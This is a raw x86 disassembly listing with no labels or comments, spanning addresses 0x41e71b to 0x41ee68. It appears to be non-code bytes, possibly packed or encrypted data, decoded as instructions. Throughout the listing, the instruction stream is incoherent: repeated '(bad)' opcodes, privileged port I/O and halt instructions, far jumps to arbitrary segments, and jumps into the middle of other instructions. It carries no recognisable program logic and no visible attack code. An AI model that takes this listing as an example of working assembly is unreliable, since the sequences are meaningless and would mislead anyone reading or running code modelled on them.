  41e71b:	and    ebx,edi
  41e71d:	mov    DWORD PTR [ecx],ebp
  41e71f:	adc    BYTE PTR [edx],al
  41e721:	enter  0x1db9,0xe
  41e725:	(bad)  
  41e726:	push   eax
  41e727:	inc    ebx
  41e728:	loope  0x41e773
  41e72a:	sub    cl,BYTE PTR [ebp-0x5b3d24b3]
  41e730:	pop    ss
  41e731:	out    dx,eax
  41e732:	cmp    cl,ah
  41e734:	loope  0x41e786
  41e736:	aas    
  41e737:	ror    bl,1
  41e739:	daa    
  41e73a:	mov    ds:0xc4430a8f,al
  41e73f:	mov    bh,0x6b
  41e741:	daa    
  41e742:	call   0xc076:0x525f9391
  41e749:	jg     0x41e79d
  41e74b:	cdq    
  41e74c:	xor    DWORD PTR [ecx-0x5bcc9c5c],edx
  41e752:	cwde   
  41e753:	adc    cl,0xb6
  41e756:	mov    ecx,0x681ebc80
  41e75b:	jmp    0x23924c27
  41e760:	in     eax,0x4
  41e762:	dec    esp
  41e763:	pop    ecx
  41e764:	loopne 0x41e765
  41e766:	popa   
  41e767:	shl    DWORD PTR [esi+ebx*4+0x35],1
  41e76b:	inc    ebp
  41e76c:	push   0xf8249a9b
  41e771:	inc    edx
  41e772:	mov    ch,0x14
  41e774:	sub    al,0x21
  41e776:	xchg   BYTE PTR [ebx+ebx*1+0x26500096],dl
  41e77d:	xchg   esp,eax
  41e77e:	jb     0x41e739
  41e780:	jge    0x41e719
  41e782:	scas   al,BYTE PTR es:[edi]
  41e783:	ror    BYTE PTR [edi-0x5aac0c64],cl
  41e789:	out    dx,eax
  41e78a:	and    eax,0xd2037495
  41e78f:	adc    BYTE PTR [ebx+ebx*8-0x29],0x9f
  41e794:	inc    ebx
  41e795:	hlt    
  41e796:	xchg   BYTE PTR [edx-0x66],al
  41e799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e79a:	stos   BYTE PTR es:[edi],al
  41e79b:	mov    ah,0x9e
  41e79d:	xchg   ebp,eax
  41e79e:	leave  
  41e79f:	shl    BYTE PTR [eax+0x30],1
  41e7a2:	inc    esp
  41e7a3:	dec    esi
  41e7a4:	mov    esp,0x7c745271
  41e7a9:	mov    eax,ds:0xccc3f0f8
  41e7ae:	(bad)  
  41e7af:	push   ebp
  41e7b0:	mov    BYTE PTR [eax],bl
  41e7b2:	pop    es
  41e7b3:	jp     0x41e81c
  41e7b5:	test   BYTE PTR [esi+0x5c],dl
  41e7b8:	cld    
  41e7b9:	inc    edi
  41e7ba:	and    dl,0x4f
  41e7bd:	idiv   DWORD PTR [edi+ecx*4-0x7abec464]
  41e7c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7c5:	jae    0x41e80b
  41e7c7:	adc    edx,esp
  41e7c9:	push   es
  41e7ca:	enter  0xaaf1,0xcb
  41e7ce:	and    dl,ch
  41e7d0:	rol    BYTE PTR [esi-0x6],0x45
  41e7d4:	jo     0x41e792
  41e7d6:	or     DWORD PTR [ecx+edi*4+0x7e],ecx
  41e7da:	sub    DWORD PTR [eax+0x5a],0xffffff8b
  41e7de:	aad    0x79
  41e7e0:	jae    0x41e7df
  41e7e2:	jp     0x41e835
  41e7e4:	je     0x41e7a8
  41e7e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7e7:	pop    ebx
  41e7e8:	sbb    bh,BYTE PTR [ebp+0x11ab395c]
  41e7ee:	sbb    dl,dl
  41e7f0:	cwde   
  41e7f1:	jp     0x41e789
  41e7f3:	(bad)  
  41e7f4:	mov    bh,0x80
  41e7f6:	popf   
  41e7f7:	fidiv  DWORD PTR fs:[eax+0x21]
  41e7fb:	loope  0x41e817
  41e7fd:	ins    DWORD PTR es:[edi],dx
  41e7fe:	stc    
  41e7ff:	pmaxub mm6,mm5
  41e802:	dec    ecx
  41e803:	repz sbb dh,BYTE PTR [eax+0x6]
  41e807:	ja     0x41e7e8
  41e809:	inc    esi
  41e80a:	repz repnz retf 
  41e80d:	(bad)  
  41e80e:	xchg   esp,eax
  41e80f:	dec    edi
  41e810:	pop    ecx
  41e811:	jb     0x41e7aa
  41e813:	or     ecx,DWORD PTR [esi+0x28631e6d]
  41e819:	xor    DWORD PTR [ebx-0xa4141d3],edx
  41e81f:	adc    DWORD PTR [ebp+0x6f],ebx
  41e822:	mov    ebp,0x9cf6b81f
  41e827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e828:	repz shr DWORD PTR [di],1
  41e82c:	adc    eax,0x963dcde7
  41e831:	inc    esp
  41e832:	xchg   cl,bh
  41e834:	into   
  41e835:	retf   
  41e836:	jle    0x41e828
  41e838:	mov    ebp,fs
  41e83a:	mov    al,0x4f
  41e83c:	stc    
  41e83d:	mov    dh,0xfc
  41e83f:	pop    ebp
  41e840:	mov    ecx,0x1e2ddfc8
  41e845:	jmp    0x41e803
  41e847:	mov    eax,0x6eaab730
  41e84c:	mov    ecx,0x8c6194b9
  41e851:	repnz retf 
  41e853:	cli    
  41e854:	adc    eax,0x23be0d9c
  41e859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e85a:	or     BYTE PTR [ecx],bh
  41e85c:	inc    esp
  41e85d:	std    
  41e85e:	(bad)  
  41e85f:	lds    ebx,FWORD PTR [esi-0x3cfc2fa4]
  41e865:	xchg   edx,eax
  41e866:	sbb    ecx,DWORD PTR [esp+ebx*1-0x65]
  41e86a:	jp     0x41e8e6
  41e86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e86d:	jnp    0x41e85f
  41e86f:	inc    esi
  41e870:	mov    ds:0xb943b908,al
  41e875:	add    BYTE PTR [ecx+0x2f],bh
  41e878:	dec    ebp
  41e879:	push   esi
  41e87a:	stos   BYTE PTR es:[edi],al
  41e87b:	adc    esp,DWORD PTR [ecx]
  41e87d:	rol    BYTE PTR ds:0x5cdefddf,cl
  41e883:	or     ch,cl
  41e885:	retf   0xb794
  41e888:	mov    esi,0x71b16159
  41e88d:	cmp    BYTE PTR [ebx+0xbf4b566],0xcd
  41e894:	ret    0xd7bd
  41e897:	xor    DWORD PTR [eax+eax*1-0x13261313],esi
  41e89e:	pop    eax
  41e89f:	cmp    al,0x5
  41e8a1:	imul   BYTE PTR [eax+0x78567a3a]
  41e8a7:	icebp  
  41e8a8:	jge    0x41e8ce
  41e8aa:	mov    eax,ds:0x4749c65c
  41e8af:	sbb    ecx,ebx
  41e8b1:	jae    0x41e924
  41e8b3:	cmp    al,BYTE PTR [edi]
  41e8b5:	jne    0x41e873
  41e8b7:	mov    edx,0x61299738
  41e8bc:	jo     0x41e8a5
  41e8be:	or     al,0xd1
  41e8c0:	dec    esp
  41e8c1:	xchg   BYTE PTR [ecx+0x76],bl
  41e8c4:	(bad)  
  41e8c5:	jle    0x41e8e5
  41e8c7:	lods   ax,WORD PTR ds:[esi]
  41e8c9:	dec    eax
  41e8ca:	sar    BYTE PTR [esi+esi*4+0x252fa62d],0x3b
  41e8d2:	ins    DWORD PTR es:[edi],dx
  41e8d3:	mov    ah,0x14
  41e8d5:	jbe    0x41e8ac
  41e8d7:	add    al,0x66
  41e8d9:	or     BYTE PTR [eax+0xd26ca64],ch
  41e8df:	jne    0x41e87e
  41e8e1:	adc    al,0xda
  41e8e3:	sbb    al,0xe1
  41e8e5:	mov    cl,0x74
  41e8e7:	push   edx
  41e8e8:	push   edi
  41e8e9:	jmp    0x1ac4:0xc8699ee8
  41e8f0:	ins    BYTE PTR es:[edi],dx
  41e8f1:	shr    BYTE PTR [edi],1
  41e8f3:	add    al,0x6f
  41e8f5:	mov    ds:0xe212fd3b,eax
  41e8fa:	ja     0x41e90e
  41e8fc:	arpl   WORD PTR [ebp-0x2e],dx
  41e8ff:	adc    al,0xc7
  41e901:	mov    ebx,0x5be90a10
  41e906:	ss mov al,0xc9
  41e909:	test   BYTE PTR [ebx-0x18],cl
  41e90c:	inc    ebp
  41e90d:	shl    BYTE PTR [edx-0x3879a4b4],0xfa
  41e914:	sub    eax,0x64908870
  41e919:	jo     0x41e8e6
  41e91b:	scas   al,BYTE PTR es:[edi]
  41e91c:	sub    DWORD PTR [edi+0x6c],eax
  41e91f:	out    0x9e,eax
  41e921:	xor    cl,bl
  41e923:	iret   
  41e924:	js     0x41e904
  41e926:	add    edi,DWORD PTR [edx-0x2f7879ce]
  41e92c:	scas   al,BYTE PTR es:[edi]
  41e92d:	xor    esi,edx
  41e92f:	cld    
  41e930:	sar    BYTE PTR [ecx+edi*2+0x18],cl
  41e934:	std    
  41e935:	inc    ebx
  41e936:	dec    ebx
  41e937:	(bad)  [ebx*8-0x5c24c683]
  41e93e:	adc    eax,0xc4ad04c1
  41e943:	es fs ss int 0x4b
  41e948:	ins    BYTE PTR es:[edi],dx
  41e949:	arpl   WORD PTR [esi+0x511599c7],ax
  41e94f:	or     al,0x32
  41e951:	and    ebp,DWORD PTR [edx+0x53]
  41e954:	adc    eax,0xeb571afb
  41e959:	and    DWORD PTR [eax+edx*4],esp
  41e95c:	xlat   BYTE PTR ds:[ebx]
  41e95d:	rcr    BYTE PTR [ebx*8-0x5a9d4cf7],0xa3
  41e965:	js     0x41e988
  41e967:	sahf   
  41e968:	rcr    DWORD PTR [esi],1
  41e96a:	adc    ah,BYTE PTR [ebx-0xd]
  41e96d:	sbb    ecx,ebp
  41e96f:	mov    dl,0xba
  41e971:	inc    esp
  41e972:	jle    0x41e9ec
  41e974:	or     eax,0xd7132437
  41e979:	aaa    
  41e97a:	test   al,0x71
  41e97c:	mov    edi,0x8c7c781
  41e981:	mov    al,ds:0x7574d03d
  41e986:	into   
  41e987:	stos   BYTE PTR es:[edi],al
  41e988:	add    DWORD PTR [edi],esp
  41e98a:	fcomip st,st(3)
  41e98c:	or     al,0xf
  41e98e:	add    esp,esi
  41e990:	xor    DWORD PTR [esi],eax
  41e992:	pop    edx
  41e993:	push   esi
  41e994:	sub    eax,0xf903be39
  41e999:	pop    ecx
  41e99a:	add    eax,0xc396cb89
  41e99f:	adc    al,0xa6
  41e9a1:	shl    BYTE PTR [ecx-0x358bf9ac],0x85
  41e9a8:	or     DWORD PTR [edx],0xffffff98
  41e9ab:	xlat   BYTE PTR ds:[ebx]
  41e9ac:	mov    ecx,?
  41e9ae:	adc    eax,0xdb76694
  41e9b3:	test   eax,0xfaa1b73
  41e9b8:	hlt    
  41e9b9:	and    al,0x9
  41e9bb:	jmp    0x9c98:0xf2fe8051
  41e9c2:	repz enter 0xfb9d,0x3c
  41e9c7:	imul   ebp,DWORD PTR [edx],0x2a
  41e9ca:	sub    eax,0x9087547b
  41e9cf:	mov    ecx,0x3783a458
  41e9d4:	je     0x41e9c1
  41e9d6:	sahf   
  41e9d7:	xlat   BYTE PTR ds:[ebx]
  41e9d8:	or     al,0x3
  41e9da:	add    eax,0x85398979
  41e9df:	jae    0x41e9d3
  41e9e1:	adc    dl,ah
  41e9e3:	xchg   DWORD PTR [edx+0x56],edi
  41e9e6:	and    ah,BYTE PTR [eax+0x5c274638]
  41e9ec:	scas   eax,DWORD PTR es:[edi]
  41e9ed:	and    eax,0x20510bbc
  41e9f2:	leave  
  41e9f3:	stos   DWORD PTR es:[edi],eax
  41e9f4:	(bad)  
  41e9f5:	cs dec ebx
  41e9f7:	ins    DWORD PTR es:[edi],dx
  41e9f8:	sub    dh,bl
  41e9fa:	mov    dh,0xfe
  41e9fc:	mov    ch,0x6d
  41e9fe:	cmp    DWORD PTR [esp+eax*2-0x2bd36e3b],edi
  41ea05:	sti    
  41ea06:	push   0x2f
  41ea08:	and    ecx,DWORD PTR [ecx+0x79]
  41ea0b:	pop    edx
  41ea0c:	pop    esi
  41ea0d:	mov    al,0x52
  41ea0f:	aaa    
  41ea10:	pop    edx
  41ea11:	loop   0x41ea01
  41ea13:	test   BYTE PTR [esi],dh
  41ea15:	setge  ch
  41ea18:	cwde   
  41ea19:	or     BYTE PTR [edi+ecx*4],bl
  41ea1c:	arpl   WORD PTR [edi],dx
  41ea1e:	mov    ds,WORD PTR [ebx+0x38a6c2ed]
  41ea24:	test   al,0xc3
  41ea26:	icebp  
  41ea27:	push   ss
  41ea28:	dec    ebp
  41ea29:	cs sub bl,cl
  41ea2c:	in     eax,dx
  41ea2d:	mov    esp,0x5d9b6979
  41ea32:	jmp    0x41ea76
  41ea34:	push   ebx
  41ea35:	sar    BYTE PTR [edx],cl
  41ea37:	push   esi
  41ea38:	ret    0xc0a6
  41ea3b:	pop    esi
  41ea3c:	add    BYTE PTR [eax-0x737a2ba8],ah
  41ea42:	cmp    edi,DWORD PTR [ecx-0x19]
  41ea45:	adc    BYTE PTR [esi],0xbd
  41ea48:	jmp    0xb09d:0xc5ad6f7
  41ea4f:	jbe    0x41e9e8
  41ea51:	mov    ebp,0x3acb0864
  41ea56:	mov    DWORD PTR [edx-0x5],eax
  41ea59:	xor    al,0x33
  41ea5b:	xchg   ebx,eax
  41ea5c:	jge    0x41e9e4
  41ea5e:	add    DWORD PTR [edi],eax
  41ea60:	in     eax,0x4f
  41ea62:	mov    ebp,0x1fe5ee9b
  41ea67:	inc    eax
  41ea68:	xor    al,0xcf
  41ea6a:	or     DWORD PTR [edx+esi*4],esp
  41ea6d:	mov    eax,DWORD PTR [ebx+0x69]
  41ea70:	jae    0x41ea6f
  41ea72:	inc    ebx
  41ea73:	sbb    DWORD PTR ds:[ebx+esi*1+0x51],edi
  41ea78:	jp     0x41ea96
  41ea7a:	je     0x41ea36
  41ea7c:	cdq    
  41ea7d:	jg     0x41ea4c
  41ea7f:	pop    edi
  41ea80:	lods   eax,DWORD PTR ds:[esi]
  41ea81:	mov    edi,0x9062ef9a
  41ea86:	add    ah,BYTE PTR [ecx+0x3b09de47]
  41ea8c:	fisubr DWORD PTR [esi-0x32]
  41ea8f:	(bad)  
  41ea90:	daa    
  41ea91:	stc    
  41ea92:	stc    
  41ea93:	sti    
  41ea94:	sti    
  41ea95:	call   0x3baa72dd
  41ea9a:	xchg   esi,eax
  41ea9b:	adc    BYTE PTR [eax-0x4e94662f],al
  41eaa1:	mov    bh,0xa1
  41eaa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaa4:	addr16 mov al,ds:0x2315
  41eaa8:	pop    edi
  41eaa9:	xor    ecx,0xb8bc30a1
  41eaaf:	add    al,0x69
  41eab1:	mov    dh,0x33
  41eab3:	or     dl,BYTE PTR [ebx+0x316d12a]
  41eab9:	sbb    cl,BYTE PTR [eax]
  41eabb:	jno    0x41ea45
  41eabd:	fsubr  st(0),st
  41eabf:	sbb    al,0x5a
  41eac1:	pop    ebx
  41eac2:	xchg   esi,eax
  41eac3:	push   ebp
  41eac4:	int3   
  41eac5:	ret    0x2036
  41eac8:	push   ecx
  41eac9:	out    dx,al
  41eaca:	fs jnp 0x41ea96
  41eacd:	xor    edi,ebp
  41eacf:	daa    
  41ead0:	inc    ebp
  41ead1:	mov    ebp,0x3b3883ec
  41ead6:	or     BYTE PTR [ecx+0x448e651b],dl
  41eadc:	loopne 0x41ea86
  41eade:	retf   0xf516
  41eae1:	imul   ebx,ecx,0x7a
  41eae4:	inc    esi
  41eae5:	or     edx,0xfffffff2
  41eae8:	outs   dx,DWORD PTR ds:[esi]
  41eae9:	scas   eax,DWORD PTR es:[edi]
  41eaea:	mov    edi,0x3939a61
  41eaef:	retf   
  41eaf0:	xchg   esp,eax
  41eaf1:	xor    bl,dh
  41eaf3:	sub    DWORD PTR [edi],ebp
  41eaf5:	gs sbb eax,0x5126975
  41eafb:	add    BYTE PTR [edx-0x3f],ch
  41eafe:	sbb    eax,0x75f48cda
  41eb03:	stc    
  41eb04:	outs   dx,DWORD PTR ds:[esi]
  41eb05:	jbe    0x41eb14
  41eb07:	loop   0x41eb46
  41eb09:	mov    dl,0xc5
  41eb0b:	daa    
  41eb0c:	mov    dl,0xeb
  41eb0e:	imul   ebp,DWORD PTR [edx-0x7adeb3f9],0x95812bc1
  41eb18:	jecxz  0x41eb49
  41eb1a:	inc    edi
  41eb1b:	cmc    
  41eb1c:	jb     0x41eb9d
  41eb1e:	xor    BYTE PTR [edx+0x32f58b98],bh
  41eb24:	or     ah,BYTE PTR [eax-0x34a166d3]
  41eb2a:	pop    eax
  41eb2b:	fwait
  41eb2c:	test   BYTE PTR [edx+0x4b],0xeb
  41eb30:	retf   0xfa91
  41eb33:	xchg   esp,eax
  41eb34:	ins    DWORD PTR es:[edi],dx
  41eb35:	push   0xba8e8603
  41eb3a:	mov    DWORD PTR [edx],ebp
  41eb3c:	std    
  41eb3d:	jbe    0x41eb57
  41eb3f:	adc    cl,BYTE PTR [ebx]
  41eb41:	retf   0x958f
  41eb44:	popf   
  41eb45:	imul   edx,DWORD PTR [edx],0x61b66b75
  41eb4b:	add    dl,dl
  41eb4d:	lods   al,BYTE PTR ds:[esi]
  41eb4e:	mov    al,ds:0x978fdef3
  41eb53:	fidiv  DWORD PTR [edx]
  41eb55:	arpl   WORD PTR [ecx-0x19],cx
  41eb58:	adc    eax,0xc81efdca
  41eb5d:	aaa    
  41eb5e:	jge    0x41ebcc
  41eb60:	outs   dx,DWORD PTR ds:[esi]
  41eb61:	xchg   DWORD PTR [esi-0x61],edi
  41eb64:	and    DWORD PTR [edi+0x7385c196],esi
  41eb6a:	lock pushf 
  41eb6c:	pop    esp
  41eb6d:	es jno 0x41eb17
  41eb70:	in     al,0xa3
  41eb72:	js     0x41eb6b
  41eb74:	mov    ds:0xb932010f,eax
  41eb79:	jge    0x41eb1b
  41eb7b:	xchg   ebp,eax
  41eb7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb7d:	mov    ecx,?
  41eb7f:	jmp    0x41ebf5
  41eb81:	xchg   esi,eax
  41eb82:	and    ah,dh
  41eb84:	imul   edx,DWORD PTR [edi+0x66ec86d4],0x22
  41eb8b:	adc    cl,al
  41eb8d:	mov    al,0x92
  41eb8f:	lods   eax,DWORD PTR ds:[esi]
  41eb90:	pop    es
  41eb91:	aam    0xa3
  41eb93:	xor    dh,ch
  41eb95:	jae    0x41eb58
  41eb97:	nop
  41eb98:	inc    edi
  41eb99:	cld    
  41eb9a:	popa   
  41eb9b:	sbb    al,0x4c
  41eb9d:	bound  edi,QWORD PTR [ebx-0x18a56e71]
  41eba3:	dec    ebp
  41eba4:	xchg   edi,eax
  41eba5:	loopne 0x41ebd4
  41eba7:	sar    eax,cl
  41eba9:	pop    ebp
  41ebaa:	sub    ebx,0x9c31eabf
  41ebb0:	das    
  41ebb1:	cmp    edx,DWORD PTR [edx+eax*4-0x47]
  41ebb5:	in     al,0x63
  41ebb7:	pop    ss
  41ebb8:	popf   
  41ebb9:	pop    esp
  41ebba:	and    bh,bl
  41ebbc:	fist   DWORD PTR [ebx+0x3]
  41ebbf:	sahf   
  41ebc0:	add    eax,0xb74d171c
  41ebc5:	iret   
  41ebc6:	push   es
  41ebc7:	mov    edx,DWORD PTR [ecx+0x263178e]
  41ebcd:	je     0x41ebd4
  41ebcf:	data16 and BYTE PTR [eax],dh
  41ebd2:	mov    ah,0x27
  41ebd4:	jge    0x41ec06
  41ebd6:	add    dh,BYTE PTR [ecx]
  41ebd8:	or     ebp,edi
  41ebda:	test   al,0x96
  41ebdc:	xchg   dh,bh
  41ebde:	rol    DWORD PTR [esi+0x27],cl
  41ebe1:	xor    BYTE PTR [esp+ebp*1+0x54d353e0],0x33
  41ebe9:	pop    esi
  41ebea:	dec    ecx
  41ebeb:	aad    0xa0
  41ebed:	or     BYTE PTR [ecx+eax*4-0x7fd1ef9c],0x3d
  41ebf5:	mov    bh,0x55
  41ebf7:	pusha  
  41ebf8:	test   al,0x21
  41ebfa:	mov    eax,0xa7db122
  41ebff:	aad    0x75
  41ec01:	ffreep st(1)
  41ec03:	(bad)  
  41ec04:	jnp    0x41ec21
  41ec06:	or     BYTE PTR [ebx+0x13d25555],0xf2
  41ec0d:	cdq    
  41ec0e:	cmp    DWORD PTR ss:[edi-0xf22bedc],0x706c880b
  41ec19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec1a:	stc    
  41ec1b:	and    DWORD PTR [eax+0x32dd7ac8],edi
  41ec21:	cmp    eax,0x82277ebf
  41ec26:	adc    eax,0xff07d1f0
  41ec2b:	loopne 0x41ec1e
  41ec2d:	cdq    
  41ec2e:	test   al,0xfc
  41ec30:	(bad)  
  41ec31:	retf   0xe548
  41ec34:	cld    
  41ec35:	adc    ah,ah
  41ec37:	or     al,0x14
  41ec39:	sub    eax,0x62f0f7c3
  41ec3e:	mov    esp,0xc9871924
  41ec43:	sbb    al,0x1e
  41ec45:	jmp    0xf8da:0xf145bdd
  41ec4c:	mov    esi,0xd6f25c1f
  41ec51:	xchg   DWORD PTR [edi],esi
  41ec53:	xchg   ebp,eax
  41ec54:	cmp    ebp,edx
  41ec56:	stos   BYTE PTR es:[edi],al
  41ec57:	and    DWORD PTR [edi-0x25d82190],esp
  41ec5d:	(bad)
  41ec63:	ret    0xbcdc
  41ec66:	scas   al,BYTE PTR es:[edi]
  41ec67:	or     ebp,DWORD PTR [esi-0x333a8247]
  41ec6d:	inc    esi
  41ec6e:	out    dx,al
  41ec6f:	dec    edx
  41ec70:	retf   
  41ec71:	imul   edx,DWORD PTR [ebx+ebp*4],0xcc90f85f
  41ec78:	cmp    ecx,esi
  41ec7a:	xor    al,0x6a
  41ec7c:	lods   eax,DWORD PTR ds:[esi]
  41ec7d:	icebp  
  41ec7e:	xchg   ebx,eax
  41ec7f:	repz dec esi
  41ec81:	arpl   WORD PTR [eax-0x54],sp
  41ec84:	jo     0x41ecc1
  41ec86:	push   cs
  41ec87:	jbe    0x41ecb0
  41ec89:	repnz mov dl,0xc9
  41ec8c:	out    dx,al
  41ec8d:	pop    edx
  41ec8e:	sub    BYTE PTR [edx+ebx*8+0x725a47f8],bl
  41ec95:	cmp    BYTE PTR [edi+0x7d1289ea],bl
  41ec9b:	cmp    eax,0x759e699
  41eca0:	test   eax,0x989475b2
  41eca5:	xor    bl,BYTE PTR [edi-0xd]
  41eca8:	mov    BYTE PTR [esi+ebp*2+0x27],bh
  41ecac:	inc    ebx
  41ecad:	(bad)
  41ecb0:	std    
  41ecb1:	leave  
  41ecb2:	loopne 0x41ecf9
  41ecb4:	sbb    BYTE PTR ds:0x3d8b82bf,dl
  41ecba:	push   gs
  41ecbc:	mov    eax,0x9ac1e4bd
  41ecc1:	out    0x56,eax
  41ecc3:	fs dec esp
  41ecc5:	xchg   ecx,eax
  41ecc6:	cmp    ecx,DWORD PTR [ebx]
  41ecc8:	in     al,dx
  41ecc9:	hlt    
  41ecca:	popf   
  41eccb:	sar    eax,cl
  41eccd:	loopne 0x41ed1d
  41eccf:	arpl   WORD PTR [eax-0x3e],si
  41ecd2:	out    0xbc,eax
  41ecd4:	nop
  41ecd5:	mov    edi,ecx
  41ecd7:	out    dx,eax
  41ecd8:	imul   ebp,DWORD PTR [edi-0x142bdd82],0x185eb39
  41ece2:	ret    
  41ece3:	cmp    cl,BYTE PTR [edi-0x2b0702bf]
  41ece9:	cwde   
  41ecea:	pop    ebx
  41eceb:	mov    ebx,0x3b9238b9
  41ecf0:	and    bh,dl
  41ecf2:	aaa    
  41ecf3:	push   ds
  41ecf4:	fiadd  WORD PTR [edi]
  41ecf6:	mov    DWORD PTR [ebx+edx*1-0x2ead37f],esp
  41ecfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecfe:	cs aaa 
  41ed00:	push   0x99bdf98b
  41ed05:	dec    ebp
  41ed06:	scas   al,BYTE PTR es:[edi]
  41ed07:	outs   dx,DWORD PTR ds:[esi]
  41ed08:	imul   edi,DWORD PTR [edi+0x7fca7bea],0x1bdce877
  41ed12:	fwait
  41ed13:	xchg   esp,eax
  41ed14:	scas   eax,DWORD PTR es:[edi]
  41ed15:	sbb    BYTE PTR [ebx],ch
  41ed17:	push   edx
  41ed18:	cwde   
  41ed19:	mov    dh,0xb0
  41ed1b:	lea    esi,[eax+0x9e6030f]
  41ed21:	hlt    
  41ed22:	scas   eax,DWORD PTR es:[edi]
  41ed23:	dec    edi
  41ed24:	mov    eax,0x9c66b5de
  41ed29:	mov    edx,0xc0ec3b09
  41ed2e:	xchg   edi,eax
  41ed2f:	ins    BYTE PTR es:[edi],dx
  41ed30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed31:	clc    
  41ed32:	outs   dx,BYTE PTR ds:[esi]
  41ed33:	cmp    eax,ebp
  41ed35:	(bad)  
  41ed37:	xchg   ebp,eax
  41ed38:	mov    esi,0xd589e736
  41ed3d:	popa   
  41ed3e:	out    0x6f,al
  41ed40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed41:	mov    bl,0xfc
  41ed43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed44:	outs   dx,BYTE PTR ds:[esi]
  41ed45:	out    0x1f,al
  41ed47:	popf   
  41ed48:	push   0xffffffb5
  41ed4a:	mov    bl,0xb0
  41ed4c:	stos   BYTE PTR es:[edi],al
  41ed4d:	xchg   esi,eax
  41ed4e:	adc    DWORD PTR [ebx-0x1dbb406f],edi
  41ed54:	push   ds
  41ed55:	ret    
  41ed56:	mov    al,ds:0xfc0f6a3d
  41ed5b:	lea    ecx,[esi+0x2662288c]
  41ed61:	xor    al,0xed
  41ed63:	cs push ebp
  41ed65:	cmp    cl,BYTE PTR [esi]
  41ed67:	cdq    
  41ed68:	fst    QWORD PTR [edx-0x412e5981]
  41ed6e:	rcr    DWORD PTR [ecx],1
  41ed70:	and    eax,0xee82b90f
  41ed75:	cli    
  41ed76:	repz or ebx,esp
  41ed79:	out    dx,eax
  41ed7a:	pop    ebp
  41ed7b:	ror    BYTE PTR [edi],1
  41ed7d:	cmp    ecx,DWORD PTR [eax]
  41ed7f:	fimul  WORD PTR [edi-0x2d]
  41ed82:	add    al,0x77
  41ed84:	hlt    
  41ed85:	inc    ebp
  41ed86:	mov    ds:0x402c85b1,eax
  41ed8b:	or     BYTE PTR ds:[esi+0x5f],ah
  41ed8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed90:	lea    esi,[ebp-0x57520b2e]
  41ed96:	and    BYTE PTR [eax],ah
  41ed98:	daa    
  41ed99:	jle    0x41ed6e
  41ed9b:	ss inc ebp
  41ed9d:	push   esi
  41ed9e:	ins    BYTE PTR es:[edi],dx
  41ed9f:	pusha  
  41eda0:	push   edx
  41eda1:	dec    esi
  41eda2:	xchg   DWORD PTR [ebp-0xc],esi
  41eda5:	call   0x931c5be0
  41edaa:	stc    
  41edab:	leave  
  41edac:	inc    esi
  41edad:	in     eax,0x40
  41edaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb0:	jne    0x41ede9
  41edb2:	cmc    
  41edb3:	in     al,dx
  41edb4:	inc    edx
  41edb5:	arpl   WORD PTR [eiz*4+0x1f04a046],si
  41edbc:	test   DWORD PTR [eax-0x10b5fc63],edx
  41edc2:	push   esi
  41edc3:	int    0x72
  41edc5:	xchg   ecx,eax
  41edc6:	push   ss
  41edc7:	jnp    0x41ee0e
  41edc9:	rcl    DWORD PTR [ebp+0x74],0xda
  41edcd:	xor    edi,DWORD PTR [esp+ebx*2-0x32b9f064]
  41edd4:	or     al,0xf9
  41edd6:	loopne 0x41ee51
  41edd8:	(bad)  
  41edda:	inc    ebp
  41eddb:	mov    ecx,0x400cfee4
  41ede0:	push   ecx
  41ede1:	mov    WORD PTR [edx-0x4d],?
  41ede4:	xchg   edi,eax
  41ede5:	mov    ebx,0xa8f73fd7
  41edea:	inc    ecx
  41edeb:	mov    ecx,esp
  41eded:	and    edi,DWORD PTR [ebp-0x7e]
  41edf0:	ret    
  41edf1:	sar    ch,cl
  41edf3:	xchg   edx,eax
  41edf4:	jno    0x41ee63
  41edf6:	test   eax,0x370c1598
  41edfb:	or     eax,0x18575326
  41ee00:	test   eax,0xa8bdda9f
  41ee05:	push   ebp
  41ee06:	mov    ah,bl
  41ee08:	sub    eax,0x6e486c88
  41ee0d:	loope  0x41edca
  41ee0f:	sbb    eax,0x9d4a6e60
  41ee14:	daa    
  41ee15:	xchg   ecx,eax
  41ee16:	adc    eax,0x4fd3aea7
  41ee1b:	cmp    eax,0xf3499353
  41ee20:	sbb    bl,dl
  41ee22:	shr    DWORD PTR [edx-0x17bda28],0xc2
  41ee29:	xchg   edx,eax
  41ee2a:	addr16 in eax,0x71
  41ee2d:	out    0x67,eax
  41ee2f:	xchg   ebp,eax
  41ee30:	lods   eax,DWORD PTR ds:[esi]
  41ee31:	push   edx
  41ee32:	outs   dx,DWORD PTR ds:[esi]
  41ee33:	retf   
  41ee34:	mov    ecx,0xd1adf859
  41ee39:	mov    eax,ebp
  41ee3b:	scas   al,BYTE PTR es:[edi]
  41ee3c:	scas   eax,DWORD PTR es:[edi]
  41ee3d:	fmul   DWORD PTR [esi]
  41ee3f:	pop    es
  41ee40:	adc    edx,DWORD PTR [edi+0x1b]
  41ee43:	cmp    DWORD PTR [ebx],0x94d348c
  41ee49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee4a:	mov    WORD PTR [edx-0xd],ds
  41ee4d:	repz add al,0x10
  41ee50:	add    DWORD PTR [esi],edi
  41ee52:	or     al,0x8f
  41ee54:	pusha  
  41ee55:	sti    
  41ee56:	scas   eax,DWORD PTR es:[edi]
  41ee57:	cmp    DWORD PTR [ebx],0xfd09f596
  41ee5d:	(bad)  
  41ee5e:	daa    
  41ee5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee60:	jo     0x41eed8
  41ee62:	pop    ebx
  41ee63:	push   0x311b7de8
  41ee68:	sub    dl,BYTE PTR [ebp-0x489a3a52]
